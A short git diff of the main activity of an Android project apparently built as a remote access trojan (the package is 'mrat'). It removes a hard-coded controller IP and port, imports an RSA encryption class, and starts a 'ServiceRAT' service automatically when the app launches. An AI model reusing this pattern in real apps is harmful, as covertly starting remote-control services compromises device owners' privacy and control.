@@ -42,12 +42,10 @@ import java.util.List;
 import java.util.Locale;
 import java.util.TimeZone;
 
+import afernandezb92.mrat.cipher.RSAEncryption;
+
 
 public class MainActivity extends AppCompatActivity {
-
-    private static final String hostname = "192.168.1.45";
-    private static final int portnumber = 8888;
-
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -55,6 +53,6 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         //Con esta llamada funcionaba cuando estaba todo en MainActivity
         //Client client = new Client(hostname, portnumber, MainActivity.this, findViewById(android.R.id.content));
-        startService(new Intent(this, ServiceRAT.class));
+       startService(new Intent(this, ServiceRAT.class));
     }
 }
